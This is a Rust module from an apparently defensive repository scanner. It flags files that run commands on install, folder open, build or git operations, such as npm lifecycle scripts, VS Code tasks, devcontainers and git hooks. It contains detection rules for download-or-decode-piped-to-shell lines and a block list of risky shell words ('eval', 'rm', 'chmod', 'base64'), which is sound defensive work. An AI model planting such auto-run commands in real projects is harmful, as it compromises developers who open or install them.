//! Auto-run surfaces: install scripts, editor tasks, devcontainers, build files, git config
//! (Task 9).
//!
//! `surfaces` reads one file as data and never runs anything. It returns the commands the file
//! starts by itself (a [`Surface`] each, rated later by the orchestrator from trigger and shape)
//! and pushes into `out` the findings that need no command: a setting that redirects a tool, a
//! wrapper that downloads from another host, a git hook. A file that holds surfaces also gets one
//! INFO `autorun.inventory` finding.
//!
//! Rules of the surfaces: `autorun.npm-lifecycle`, `autorun.npm-start-data`,
//! `autorun.vscode-folder-open`, `autorun.devcontainer-host`, `autorun.build-script`,
//! `autorun.envrc`, `autorun.pre-commit-hook`, `autorun.husky-hook`, `autorun.justfile`,
//! `autorun.taskfile`, `autorun.msbuild-exec` and `autorun.setup-py` (every `setup.py`, an
//! Install surface). A tasks, settings or devcontainer file the JSONC
//! reader rejects gives `autorun.unparsed` (MEDIUM): the editor may read what this cannot.
//!
//! Two functions are for the orchestrator to call outside `surfaces`: `entry_findings` once with
//! the path of every tree entry (git hooks, which must count even as a symlink), and
//! `raise_gitattributes_filters` for every text file (a filter that another file tells you to
//! configure).

use std::collections::{BTreeSet, HashMap, HashSet};
use std::rc::Rc;
use std::sync::LazyLock;

use anthology_pycompat::json::{Map, Value};
use regex::{Captures, Regex};

use crate::shape::{self, Shape};
use crate::{FileCtx, Finding, Group, Severity, Surface, Trigger, jsonc, tomlish};

const READ_FIRST: &str =
    "Read this file before you open the folder in an editor or run an install.";

/// Scans one file. See the module docs.
pub(crate) fn surfaces(f: &FileCtx, out: &mut Vec<Finding>) -> Vec<Surface> {
    let path = f.path;
    if by_presence(path, out) {
        return Vec::new();
    }
    // A file the decoder could not read as clean text is read lossily: a stray byte must not
    // hide what the file runs.
    let lossy;
    let text = match f.text {
        Some(t) => t,
        None => {
            lossy = String::from_utf8_lossy(f.bytes);
            &*lossy
        }
    };
    let mut cx = Cx {
        path,
        text,
        out,
        found: Vec::new(),
        notes: Vec::new(),
    };
    let name = base(path);
    let in_dir = base(parent(path));
    if name == "package.json" {
        if !path.split('/').any(|c| c == "node_modules") {
            package_json(&mut cx);
        }
    } else if name == "tasks.json" && matches!(in_dir, ".vscode" | ".cursor") {
        vscode_tasks(&mut cx);
    } else if name == "settings.json" && in_dir == ".vscode" {
        vscode_settings(&mut cx);
    } else if name.ends_with(".code-workspace") {
        code_workspace(&mut cx);
    } else if name == ".devcontainer.json"
        || (name == "devcontainer.json" && dir_above(path, ".devcontainer").is_some())
    {
        devcontainer(&mut cx);
    } else if matches!(name, "Makefile" | "makefile" | "GNUmakefile" | "configure")
        || name.ends_with(".mk")
        || name.ends_with(".m4")
    {
        build_script(&mut cx);
    } else if name == ".envrc" {
        shell_surfaces(&mut cx, "autorun.envrc", false);
    } else if name == ".pre-commit-config.yaml" {
        pre_commit(&mut cx);
    } else if let Some(root) = dir_above(path, ".husky") {
        if !path[root.len()..]
            .trim_start_matches('/')
            .starts_with(".husky/_/")
        {
            shell_surfaces(&mut cx, "autorun.husky-hook", false);
        }
    } else if matches!(name, "Justfile" | "justfile" | ".justfile") {
        shell_surfaces(&mut cx, "autorun.justfile", true);
    } else if matches!(
        name,
        "Taskfile.yml" | "Taskfile.yaml" | "taskfile.yml" | "taskfile.yaml"
    ) {
        taskfile(&mut cx);
    } else if name.ends_with(".csproj") || name.ends_with(".props") || name.ends_with(".targets") {
        msbuild(&mut cx);
    } else if name == "setup.py" {
        setup_py(&mut cx);
    } else if name == "pyproject.toml" {
        pyproject(&mut cx);
    } else if path_is(path, ".cargo/config.toml") || path_is(path, ".cargo/config") {
        cargo_config(&mut cx);
    } else if name == "rust-toolchain.toml" || name == "rust-toolchain" {
        rust_toolchain(&mut cx);
    } else if path_is(path, "gradle/wrapper/gradle-wrapper.properties") {
        wrapper_properties(
            &mut cx,
            "autorun.gradle-wrapper",
            &["distributionUrl"],
            "services.gradle.org",
        );
    } else if path_is(path, ".mvn/wrapper/maven-wrapper.properties") {
        wrapper_properties(
            &mut cx,
            "autorun.maven-extensions",
            &["distributionUrl", "wrapperUrl"],
            "repo.maven.apache.org",
        );
    } else if name == ".gitmodules" {
        gitmodules(&mut cx);
    } else if name == ".gitattributes" {
        gitattributes(&mut cx);
    } else if path_is(path, ".git/config") || path_is(path, ".git/config.worktree") {
        git_config(&mut cx);
    } else if name == ".npmrc" {
        npmrc(&mut cx);
    } else if name == ".yarnrc.yml" || name == ".yarnrc" {
        yarn_path(&mut cx);
    }
    let Cx {
        out, found, notes, ..
    } = cx;
    if !found.is_empty() {
        out.push(inventory(path, &found, &notes));
    }
    found
}

/// The `(name, command)` pairs of the `scripts` of a `package.json`, in file order. A script whose
/// value is not a string is left out; a file that does not parse gives none.
pub(crate) fn npm_scripts(f: &FileCtx) -> Vec<(String, String)> {
    f.text
        .and_then(|t| jsonc::parse(t).ok())
        .map(|v| script_pairs(&v))
        .unwrap_or_default()
}

fn script_pairs(v: &Value) -> Vec<(String, String)> {
    let Some(scripts) = v
        .as_object()
        .and_then(|o| o.get("scripts"))
        .and_then(Value::as_object)
    else {
        return Vec::new();
    };
    scripts
        .iter()
        .filter_map(|(k, v)| Some((k.to_string(), v.as_str()?.to_string())))
        .collect()
}

/// Raises each `autorun.gitattributes-filter` finding to HIGH when `f` is a text file (not the
/// attributes file itself) that tells the reader to set up one of its filters with
/// `git config filter.<name>.…`. The orchestrator calls this for every text file once the
/// attributes finding exists.
pub(crate) fn raise_gitattributes_filters(f: &FileCtx, findings: &mut [Finding]) {
    let Some(text) = f.text else {
        return;
    };
    if !text.contains("filter.") || !text.contains("git") {
        return;
    }
    let configured: BTreeSet<&str> = GIT_CONFIG_FILTER
        .captures_iter(text)
        .filter_map(|c| c.get(1).map(|m| m.as_str()))
        .collect();
    if configured.is_empty() {
        return;
    }
    for finding in findings.iter_mut() {
        if finding.rule != "autorun.gitattributes-filter"
            || finding.severity >= Severity::High
            || finding.path == f.path
        {
            continue;
        }
        let hit = finding.seen.split(' ').find(|n| configured.contains(n));
        if let Some(name) = hit {
            finding.severity = Severity::High;
            finding.why = format!(
                "A text file in the repo tells you to run git config for the filter {name}, \
                 so a command from the repo runs whenever git checks files in or out."
            );
        }
    }
}

static GIT_CONFIG_FILTER: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"git\s+config\s+(?:--?[\w-]+\s+)*filter\.([^\s.=]+)\.").expect("pattern compiles")
});

// What the rules share.

struct Cx<'a> {
    path: &'a str,
    text: &'a str,
    out: &'a mut Vec<Finding>,
    found: Vec<Surface>,
    /// Facts about the file for its inventory finding.
    notes: Vec<String>,
}

impl Cx<'_> {
    fn surface(
        &mut self,
        rule: &'static str,
        trigger: Trigger,
        command: &str,
        line: usize,
        dir: &str,
        floor: Severity,
    ) {
        let command = command.trim();
        if command.is_empty() {
            return;
        }
        self.found.push(Surface {
            path: self.path.to_string(),
            line,
            trigger,
            command: command.to_string(),
            rule,
            floor,
            dir: dir.to_string(),
        });
    }

    fn find(
        &mut self,
        severity: Severity,
        rule: &str,
        line: usize,
        why: &str,
        seen: &str,
        action: &str,
    ) {
        self.out
            .push(finding(self.path, severity, rule, line, why, seen, action));
    }

    /// The file runs code on open or install and is JSON the reader could not parse. That is
    /// HIGH: the tool that runs it may read what this cannot (a stray byte, padding, a cap). The
    /// raw text is then scanned for the commands the file would start.
    fn unparsed(&mut self, error: &str, kind: Raw) {
        self.find(
            Severity::High,
            "autorun.unparsed",
            0,
            "This file runs code when the folder is opened or the package installed, and it \
             could not be read as JSON with comments. The tool that runs it may read more than \
             the scan can, so what it starts is unknown. The commands found in its raw text \
             are listed.",
            error,
            READ_FIRST,
        );
        raw_surfaces(self, kind);
    }
}

/// What a file that does not parse is read as.
#[derive(Clone, Copy)]
enum Raw {
    Package,
    Tasks,
    Devcontainer,
    /// Runs nothing itself; the failure alone is the finding.
    Settings,
}

/// At most this many surfaces come from the raw text of one file.
const MAX_RAW_SURFACES: usize = 500;

static JSON_STRING: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#""((?:[^"\\]|\\.)*)""#).expect("pattern compiles"));

/// The text of a JSON string body, with its escapes decoded when it reads as one.
fn json_unescape(body: &str) -> String {
    jsonc::parse(&format!("\"{body}\""))
        .ok()
        .and_then(Value::into_string)
        .unwrap_or_else(|| body.to_string())
}

/// The strings inside a window of raw JSON, decoded.
fn json_strings(window: &str) -> Vec<String> {
    JSON_STRING
        .captures_iter(window)
        .take(MAX_RAW_SURFACES)
        .map(|c| json_unescape(&c[1]))
        .collect()
}

/// From a `[` or `{` at the start of `s` to its match, cut at 4,000 bytes. Strings are not
/// skipped: this reads text that does not parse.
fn value_window(s: &str) -> &str {
    let mut depth = 0usize;
    let mut end = s.len().min(4000);
    for (i, b) in s.bytes().enumerate().take(4000) {
        match b {
            b'[' | b'{' => depth += 1,
            b']' | b'}' => {
                depth = depth.saturating_sub(1);
                if depth == 0 {
                    return &s[..=i];
                }
            }
            _ => {}
        }
    }
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}

/// For each `"key":` in raw JSON text: the byte offset of its value and the command it holds. A
/// string is one command; an array of strings is one command line; every string in an object is
/// a command.
fn raw_values(text: &str, key: &str) -> Vec<(usize, String)> {
    let needle = format!("\"{key}\"");
    let mut out = Vec::new();
    let mut pos = 0;
    while out.len() < MAX_RAW_SURFACES
        && let Some(i) = text[pos..].find(&needle)
    {
        let after = pos + i + needle.len();
        pos = after;
        let Some(rest) = text[after..].trim_start().strip_prefix(':') else {
            continue;
        };
        let rest = rest.trim_start();
        let start = text.len() - rest.len();
        match rest.as_bytes().first() {
            Some(b'"') => {
                if let Some(m) = JSON_STRING
                    .captures(rest)
                    .filter(|c| c.get(0).is_some_and(|w| w.start() == 0))
                {
                    out.push((start, json_unescape(&m[1])));
                }
            }
            Some(b'[') => {
                let words = json_strings(value_window(rest));
                if !words.is_empty() {
                    out.push((start, join_args(&words)));
                }
            }
            Some(b'{') => out.extend(
                json_strings(value_window(rest))
                    .into_iter()
                    .map(|s| (start, s)),
            ),
            _ => {}
        }
    }
    out
}

/// Surfaces read from the raw text of a file that did not parse: the values of the keys that
/// start commands, and every line whose text is a download or decode piped to a shell, or a
/// program run on a data file.
fn raw_surfaces(cx: &mut Cx, kind: Raw) {
    let text = cx.text;
    let path = cx.path;
    let (rule, trigger, dir, keys): (&'static str, Trigger, String, &[&str]) = match kind {
        Raw::Package => (
            "autorun.npm-lifecycle",
            Trigger::Install,
            parent(path).to_string(),
            &[
                "preinstall",
                "install",
                "postinstall",
                "prepare",
                "prepublish",
                "prepack",
                "start",
                "dev",
            ],
        ),
        Raw::Tasks => (
            "autorun.vscode-folder-open",
            Trigger::Open,
            parent(parent(path)).to_string(),
            &["command"],
        ),
        Raw::Devcontainer => (
            "autorun.devcontainer-host",
            Trigger::Open,
            parent(path).to_string(),
            &["initializeCommand"],
        ),
        Raw::Settings => return,
    };
    // Tasks that do not run on folder open are not a surface.
    if matches!(kind, Raw::Tasks) && !text.contains("folderOpen") && !text.contains("\\u") {
        return;
    }
    // Byte offset, command, and the rule, trigger and floor it is rated under.
    let mut commands: Vec<(usize, String, &'static str, Trigger, Severity)> = Vec::new();
    for key in keys {
        let (rule, trigger, floor) = match kind {
            Raw::Package => match npm_rule(key) {
                Some(r) => r,
                None => continue,
            },
            _ => (rule, trigger, Severity::Info),
        };
        for (at, command) in raw_values(text, key) {
            // `start` and `dev` only count when they run a data file.
            if floor == Severity::High && shape::classify(&command) != Shape::RunsData {
                continue;
            }
            commands.push((at, command, rule, trigger, floor));
        }
    }
    let mut offset = 0;
    for line in text.split('\n') {
        if matches!(
            shape::classify(line),
            Shape::FetchExec | Shape::DecodeExec | Shape::RunsData
        ) {
            commands.push((
                offset,
                line.trim().to_string(),
                rule,
                trigger,
                Severity::Info,
            ));
        }
        offset += line.len() + 1;
    }
    commands.sort_by_key(|c| c.0);
    let (mut line, mut pos) = (1, 0);
    for (at, command, rule, trigger, floor) in commands.into_iter().take(MAX_RAW_SURFACES) {
        let at = at.min(text.len());
        line += text.as_bytes()[pos..at]
            .iter()
            .filter(|b| **b == b'\n')
            .count();
        pos = at;
        if !cx.found.iter().any(|s| s.command == command) {
            cx.surface(rule, trigger, &command, line, &dir, floor);
        }
    }
}

fn finding(
    path: &str,
    severity: Severity,
    rule: &str,
    line: usize,
    why: &str,
    seen: &str,
    action: &str,
) -> Finding {
    Finding {
        severity,
        group: Group::Autorun,
        rule: rule.to_string(),
        path: path.to_string(),
        line,
        why: why.to_string(),
        seen: seen.to_string(),
        action: action.to_string(),
        count: 1,
    }
}

fn inventory(path: &str, found: &[Surface], notes: &[String]) -> Finding {
    let mut rules: Vec<&str> = Vec::new();
    for s in found {
        if !rules.contains(&s.rule) {
            rules.push(s.rule);
        }
    }
    let mut why = format!(
        "{} command{} in this file run by themselves ({}).",
        found.len(),
        if found.len() == 1 { "" } else { "s" },
        rules.join(", ")
    );
    for note in notes {
        why.push(' ');
        why.push_str(note);
    }
    let mut f = finding(
        path,
        Severity::Info,
        "autorun.inventory",
        0,
        &why,
        "",
        READ_FIRST,
    );
    f.count = found.len();
    f
}

/// The findings that need only the path of a tree entry, not its content: `autorun.git-hooks`
/// (HIGH) for every entry under `.git/hooks/`, in the tree's own `.git` folder or a nested one,
/// whose name does not end in `.sample`. The orchestrator calls this once with the path of every
/// entry of the tree, so a hook that is a symlink (whatever it points at) or cannot be read counts
/// too; `surfaces` does not repeat it. `lower_hook_stubs` then lowers a stock installer stub.
pub(crate) fn entry_findings(paths: &[&str], out: &mut Vec<Finding>) {
    for path in paths {
        let Some(hook) = git_hook_name(path) else {
            continue;
        };
        if hook.is_empty() || hook.ends_with(".sample") {
            continue;
        }
        out.push(finding(
            path,
            Severity::High,
            "autorun.git-hooks",
            0,
            "A git hook ships inside the repo's .git folder; git runs it on commit, checkout, \
             merge and push.",
            hook,
            "Do not run git in this folder. Read the hook first.",
        ));
    }
}

/// The name of the hook at `path` when it is an entry of a `.git/hooks` folder.
fn git_hook_name(path: &str) -> Option<&str> {
    const MARK: &str = "/.git/hooks/";
    path.strip_prefix(".git/hooks/")
        .or_else(|| path.find(MARK).map(|i| &path[i + MARK.len()..]))
}

/// Lowers `autorun.git-hooks` to LOW for the file `f` when it is the stock stub that pre-commit,
/// git-lfs or lefthook writes. The orchestrator offers each text file once the entry findings
/// exist. A stub that has been edited, or any other hook, stays HIGH.
pub(crate) fn lower_hook_stubs(f: &FileCtx, findings: &mut [Finding]) {
    let Some(hook) = git_hook_name(f.path) else {
        return;
    };
    let Some(finding) = findings
        .iter_mut()
        .find(|x| x.rule == "autorun.git-hooks" && x.path == f.path)
    else {
        return;
    };
    let lossy;
    let text = match f.text {
        Some(t) => t,
        None => {
            lossy = String::from_utf8_lossy(f.bytes);
            &*lossy
        }
    };
    if let Some(tool) = known_stub(hook, text) {
        finding.severity = Severity::Low;
        finding.why = format!(
            "The hook is the stock stub {tool} writes, and it only starts {tool}. An edited \
             stub would be HIGH."
        );
    }
}

static PRE_COMMIT_ID: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^# ID: [0-9a-f]{32}$").expect("pattern compiles"));
static PRE_COMMIT_PYTHON: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^INSTALL_PYTHON=([\w./+-]+|'[^'$`\\]*')$").expect("pattern compiles")
});
static PRE_COMMIT_ARGS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^ARGS=\(hook-impl( --[\w-]+(=[\w./-]+)?)+\)$").expect("pattern compiles")
});
static LFS_GUARD: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"^command -v git-lfs >/dev/null 2>&1 \|\| \{ echo >&2 "[^"`$;|&<>]*"; exit 2; \}$"#,
    )
    .expect("pattern compiles")
});

/// The lines pre-commit writes besides its three variable lines.
const PRE_COMMIT_LINES: &[&str] = &[
    "#!/usr/bin/env bash",
    "# File generated by pre-commit: https://pre-commit.com",
    "# start templated",
    "# end templated",
    "HERE=\"$(cd \"$(dirname \"$0\")\" && pwd)\"",
    "ARGS+=(--hook-dir \"$HERE\" -- \"$@\")",
    "if [ -x \"$INSTALL_PYTHON\" ]; then",
    "    exec \"$INSTALL_PYTHON\" -mpre_commit \"${ARGS[@]}\"",
    "elif command -v pre-commit > /dev/null; then",
    "    exec pre-commit \"${ARGS[@]}\"",
    "else",
    "    echo '`pre-commit` not found.  Did you forget to activate your virtualenv?' 1>&2",
    "    exit 1",
    "fi",
];

/// The tool whose generated stub `text` is, line for line; `None` for anything else.
fn known_stub(hook: &str, text: &str) -> Option<&'static str> {
    if text.len() > 8192 {
        return None;
    }
    let lines: Vec<&str> = text.lines().map(str::trim_end).collect();
    if lines.get(2).is_some_and(|l| PRE_COMMIT_ID.is_match(l))
        && PRE_COMMIT_LINES.iter().all(|want| lines.contains(want))
        && lines.iter().any(|l| PRE_COMMIT_PYTHON.is_match(l))
        && lines.iter().any(|l| PRE_COMMIT_ARGS.is_match(l))
        && lines.iter().all(|l| {
            l.is_empty()
                || PRE_COMMIT_LINES.contains(l)
                || PRE_COMMIT_ID.is_match(l)
                || PRE_COMMIT_PYTHON.is_match(l)
                || PRE_COMMIT_ARGS.is_match(l)
        })
    {
        return Some("pre-commit");
    }
    let body: Vec<&str> = lines.iter().copied().filter(|l| !l.is_empty()).collect();
    if matches!(
        hook,
        "pre-push" | "post-checkout" | "post-commit" | "post-merge"
    ) && body.len() == 3
        && body[0] == "#!/bin/sh"
        && LFS_GUARD.is_match(body[1])
        && body[2] == format!("git lfs {hook} \"$@\"")
    {
        return Some("git-lfs");
    }
    // lefthook rewrites its stub between versions, so this one is judged by what it may hold:
    // shell glue around lefthook that runs no file and downloads, decodes or deletes nothing.
    if lines.first() == Some(&"#!/bin/sh")
        && lines.len() <= 120
        && text.contains("call_lefthook()")
        && text.contains("LEFTHOOK")
        && lines.iter().all(|l| {
            matches!(shape::classify(l), Shape::Allowlisted | Shape::Plain)
                && shape::files_run(&strip_shell_keyword(l)).is_empty()
                && !["eval ", "rm ", "chmod ", "base64"]
                    .iter()
                    .any(|bad| l.contains(bad))
        })
    {
        return Some("lefthook");
    }
    None
}

/// The line without the shell keyword that starts it, so the command after it can be read.
fn strip_shell_keyword(line: &str) -> String {
    let t = line.trim_start();
    for kw in ["if ", "elif ", "while ", "! "] {
        if let Some(rest) = t.strip_prefix(kw) {
            return rest.trim_start().to_string();
        }
    }
    t.to_string()
}

/// Files that are a finding by being there; true when `path` is one of them.
fn by_presence(path: &str, out: &mut Vec<Finding>) -> bool {
    if git_hook_name(path).is_some() {
        // `entry_findings` rates it, from the path alone.
        return true;
    }
    let (severity, rule, why, seen) = if base(path) == "build.rs" {
        (
            Severity::Info,
            "autorun.build-rs",
            "A Cargo build script runs during cargo build, check and test, and when an editor \
             loads the crate.",
            "build.rs",
        )
    } else if path_is(path, "gradle/wrapper/gradle-wrapper.jar") {
        (
            Severity::Info,
            "autorun.gradle-wrapper",
            "A Gradle wrapper jar is code that ./gradlew runs. Check it against the \
             published checksum for the Gradle version.",
            "gradle-wrapper.jar",
        )
    } else if path_is(path, ".mvn/extensions.xml") {
        (
            Severity::Medium,
            "autorun.maven-extensions",
            "Maven loads the extensions listed here, from the network, before it builds \
             anything.",
            "extensions.xml",
        )
    } else {
        return false;
    };
    out.push(finding(path, severity, rule, 0, why, seen, READ_FIRST));
    true
}

fn base(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// The folder of `path`; empty for a file at the root.
fn parent(path: &str) -> &str {
    path.rsplit_once('/').map_or("", |(dir, _)| dir)
}

/// True when `path` is `tail` or ends with `/tail`.
fn path_is(path: &str, tail: &str) -> bool {
    path == tail
        || path
            .strip_suffix(tail)
            .is_some_and(|head| head.ends_with('/'))
}

/// The part of `path` before the first folder named `folder`; `None` when there is none.
fn dir_above<'a>(path: &'a str, folder: &str) -> Option<&'a str> {
    let marker = format!("{folder}/");
    let mut from = 0;
    while let Some(i) = path[from..].find(&marker) {
        let at = from + i;
        if at == 0 {
            return Some("");
        }
        if path.as_bytes()[at - 1] == b'/' {
            return Some(&path[..at - 1]);
        }
        from = at + marker.len();
    }
    None
}

/// The 1-based line of byte `at`.
fn line_at(text: &str, at: usize) -> usize {
    1 + text.as_bytes()[..at.min(text.len())]
        .iter()
        .filter(|b| **b == b'\n')
        .count()
}

/// The line of the first `"key":` at or after byte `from`; 0 when there is none.
fn key_line(text: &str, from: usize, key: &str) -> usize {
    let needle = format!("\"{key}\"");
    let mut pos = from.min(text.len());
    while let Some(i) = text[pos..].find(&needle) {
        let at = pos + i;
        let end = at + needle.len();
        if text[end..].trim_start().starts_with(':') {
            return line_at(text, at);
        }
        pos = end;
    }
    0
}

/// The line of the first JSON string equal to `value`; 0 when there is none.
fn str_line(text: &str, value: &str) -> usize {
    let needle = format!("\"{}\"", value.replace('\\', "\\\\").replace('"', "\\\""));
    text.find(&needle).map_or(0, |at| line_at(text, at))
}

fn unquote(v: &str) -> &str {
    let v = v.trim();
    for q in ['"', '\''] {
        if v.len() >= 2 && v.starts_with(q) && v.ends_with(q) {
            return &v[1..v.len() - 1];
        }
    }
    v
}

/// The host of a URL, lowercase, without `user@`, port or trailing dot; empty for `file:///x`.
fn url_host(url: &str) -> String {
    let u = url.trim().to_ascii_lowercase();
    let rest = match u.find("://") {
        Some(i)
            if u[..i]
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || "+.-".contains(c)) =>
        {
            &u[i + 3..]
        }
        _ => u.as_str(),
    };
    let authority = rest.split(['/', '?', '#', '\\']).next().unwrap_or("");
    let host = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
    let host = if host.starts_with('[') {
        host
    } else {
        host.split(':').next().unwrap_or("")
    };
    host.trim_end_matches('.').to_string()
}

/// One `key = value` line of an INI-like file with the `[section]` above it. A key is kept as
/// written. A value loses only the spaces and tabs around it, so a stray carriage return stays.
struct Ini {
    line: usize,
    /// Shared by the entries of one section, so a huge header is not copied per entry.
    section: Rc<str>,
    key: String,
    value: String,
}

/// The entries of `text`. A file that uses CRLF for every line break loses the `\r` of each, so
/// only a carriage return that is not a line ending shows in a value.
fn ini_entries(text: &str) -> Vec<Ini> {
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    let bytes = text.as_bytes();
    let all_crlf = text.contains('\n')
        && text
            .match_indices('\n')
            .all(|(i, _)| i > 0 && bytes[i - 1] == b'\r');
    let mut section: Rc<str> = Rc::from("");
    let mut out = Vec::new();
    for (i, raw) in text.split('\n').enumerate() {
        let raw = if all_crlf {
            raw.strip_suffix('\r').unwrap_or(raw)
        } else {
            raw
        };
        let t = raw.trim_start_matches([' ', '\t']);
        if t.is_empty() || t.starts_with(['#', ';']) {
            continue;
        }
        // `[core] key = value` is a header and an entry on one line.
        let mut entry = t;
        if let Some(rest) = t.strip_prefix('[') {
            let Some(end) = rest.find(']') else {
                continue;
            };
            section = Rc::from(rest[..end].trim());
            entry = rest[end + 1..].trim_matches([' ', '\t']);
            if entry.starts_with(['#', ';']) {
                continue;
            }
        }
        if let Some((k, v)) = entry.split_once('=') {
            out.push(Ini {
                line: i + 1,
                section: Rc::clone(&section),
                key: k.trim().to_string(),
                value: v.trim_matches([' ', '\t']).to_string(),
            });
        }
    }
    out
}

/// A shell-like text split into logical lines.
struct Logical {
    line: usize,
    /// The first physical line starts with a space or a tab.
    indented: bool,
    text: String,
}

/// The command lines of a Makefile, a shell script or a recipe file: a line that ends in `\`
/// joins the next one; blank lines and comments (`#`, and `dnl` when `dnl` is set) are dropped;
/// a leading `@`, `-` or `+` (recipe flags) is removed.
fn logical_lines(text: &str, dnl: bool) -> Vec<Logical> {
    let mut out = Vec::new();
    let mut lines = text.lines().enumerate();
    while let Some((i, raw)) = lines.next() {
        let indented = raw.starts_with([' ', '\t']);
        let mut joined = raw.trim().to_string();
        while joined.ends_with('\\') {
            joined.pop();
            let kept = joined.trim_end().len();
            joined.truncate(kept);
            let Some((_, next)) = lines.next() else {
                break;
            };
            joined.push(' ');
            joined.push_str(next.trim());
        }
        let joined = joined.trim();
        let comment =
            joined.starts_with('#') || (dnl && (joined == "dnl" || joined.starts_with("dnl ")));
        let command = joined.trim_start_matches(['@', '-', '+']).trim_start();
        if joined.is_empty() || comment || command.is_empty() {
            continue;
        }
        out.push(Logical {
            line: i + 1,
            indented,
            text: command.to_string(),
        });
    }
    out
}

/// A YAML scalar: quotes removed, or a trailing ` # comment` cut.
fn yaml_scalar(raw: &str) -> String {
    let raw = raw.trim();
    for q in ['"', '\''] {
        if let Some(rest) = raw.strip_prefix(q)
            && let Some(end) = rest.find(q)
        {
            return rest[..end].to_string();
        }
    }
    raw.split(" #").next().unwrap_or("").trim().to_string()
}

/// `key: value` from one YAML line.
fn yaml_kv(content: &str) -> Option<(&str, String)> {
    let (key, rest) = match content.find(": ") {
        Some(i) => (&content[..i], &content[i + 2..]),
        None => (content.strip_suffix(':')?, ""),
    };
    Some((key.trim(), yaml_scalar(rest)))
}

/// `|`, `>` and their variants start a block scalar.
fn is_block(value: &str) -> bool {
    value.starts_with(['|', '>'])
}

/// The non-blank lines after line index `from` that are indented deeper than `indent`, as
/// 1-based line numbers with their trimmed text.
fn block_lines(lines: &[&str], from: usize, indent: usize) -> Vec<(usize, String)> {
    let mut out = Vec::new();
    for (j, l) in lines.iter().enumerate().skip(from + 1) {
        let c = l.trim_start();
        if c.is_empty() {
            continue;
        }
        if l.len() - c.len() <= indent {
            break;
        }
        if !c.starts_with('#') {
            out.push((j + 1, c.to_string()));
        }
    }
    out
}

/// Words joined by spaces; a word with whitespace, or an empty one, is double-quoted.
fn join_args(parts: &[String]) -> String {
    parts
        .iter()
        .map(|p| {
            if p.is_empty() || p.contains(char::is_whitespace) {
                format!("\"{}\"", p.replace('"', "\\\""))
            } else {
                p.clone()
            }
        })
        .collect::<Vec<_>>()
        .join(" ")
}

// package.json

fn package_json(cx: &mut Cx) {
    let text = cx.text;
    let v = match jsonc::parse(text) {
        Ok(v) => v,
        Err(e) => return cx.unparsed(&e, Raw::Package),
    };
    let scripts = script_pairs(&v);
    let dir = parent(cx.path).to_string();
    let anchor = text.find("\"scripts\"").unwrap_or(0);
    for (name, command) in &scripts {
        let Some((rule, trigger, floor)) = npm_rule(name) else {
            continue;
        };
        // `start` and `dev` only count when they run a data file.
        if floor == Severity::High && !runs_data(command, &scripts) {
            continue;
        }
        let line = key_line(text, anchor, name);
        cx.surface(rule, trigger, command, line, &dir, floor);
    }
}

/// The rule, trigger and floor of an npm script name that starts by itself; `start` and `dev`
/// are the data-file rule (floor HIGH), which the caller applies only to a script that runs data.
fn npm_rule(name: &str) -> Option<(&'static str, Trigger, Severity)> {
    Some(match name {
        "preinstall" | "install" | "postinstall" => {
            ("autorun.npm-lifecycle", Trigger::Install, Severity::Info)
        }
        "prepare" | "prepublish" | "prepack" => {
            ("autorun.npm-lifecycle", Trigger::Build, Severity::Info)
        }
        "start" | "dev" => ("autorun.npm-start-data", Trigger::OptIn, Severity::High),
        _ => return None,
    })
}

/// True when the command, or the script of the same file it asks npm to run, runs a data file.
fn runs_data(command: &str, scripts: &[(String, String)]) -> bool {
    if shape::classify(command) == Shape::RunsData {
        return true;
    }
    shape::npm_run_target(command)
        .and_then(|t| scripts.iter().find(|(n, _)| *n == t))
        .is_some_and(|(_, c)| shape::classify(c) == Shape::RunsData)
}

// VS Code and Cursor

fn vscode_tasks(cx: &mut Cx) {
    let v = match jsonc::parse(cx.text) {
        Ok(v) => v,
        Err(e) => return cx.unparsed(&e, Raw::Tasks),
    };
    let Some(tasks) = v
        .as_object()
        .and_then(|o| o.get("tasks"))
        .and_then(Value::as_array)
    else {
        return;
    };
    let dir = parent(parent(cx.path)).to_string();
    tasks_from(cx, tasks, &dir);
}

/// The surfaces of the tasks of a `tasks.json` or of the `tasks` block of a workspace file.
fn tasks_from(cx: &mut Cx, tasks: &[Value], dir: &str) {
    let text = cx.text;
    let mut walk = TaskWalk {
        by_label: HashMap::new(),
        visits: 0,
    };
    for task in tasks.iter().filter_map(Value::as_object) {
        if let Some(label) = task.get("label").and_then(Value::as_str) {
            walk.by_label.entry(label).or_insert(task);
        }
    }
    let mut hidden = false;
    for task in tasks.iter().filter_map(Value::as_object) {
        if cx.found.len() >= MAX_TASK_COMMANDS || walk.visits >= MAX_TASK_VISITS {
            break;
        }
        if task
            .get("runOptions")
            .and_then(Value::as_object)
            .and_then(|o| o.get("runOn"))
            .and_then(Value::as_str)
            != Some("folderOpen")
        {
            continue;
        }
        hidden |= hides_output(task);
        let mut commands = Vec::new();
        walk.collect(task, &mut HashSet::new(), 0, &mut commands);
        for (command, literal) in commands {
            if cx.found.len() >= MAX_TASK_COMMANDS {
                break;
            }
            // A line lookup scans the file: only the first few commands get one.
            let line = if cx.found.len() < 200 {
                str_line(text, &literal)
            } else {
                0
            };
            if !cx
                .found
                .iter()
                .any(|s| s.command == command && s.line == line)
            {
                cx.surface(
                    "autorun.vscode-folder-open",
                    Trigger::Open,
                    &command,
                    line,
                    dir,
                    Severity::Info,
                );
            }
        }
    }
    if hidden {
        cx.notes.push(
            "A task that runs on folder open hides its output (reveal never, echo off)."
                .to_string(),
        );
    }
}

fn hides_output(task: &Map) -> bool {
    task.get("presentation")
        .and_then(Value::as_object)
        .is_some_and(|p| {
            p.get("reveal").and_then(Value::as_str) == Some("never")
                && p.get("echo").and_then(Value::as_bool) == Some(false)
        })
}

/// Limits on what one tasks file may make the scan do: commands kept, tasks visited in all, and
/// how deep a `dependsOn` chain is followed. A file past them is hostile, and what it lists
/// before the limit is already flagged.
const MAX_TASK_COMMANDS: usize = 1_000;
const MAX_TASK_VISITS: usize = 20_000;
const MAX_TASK_DEPTH: usize = 16;

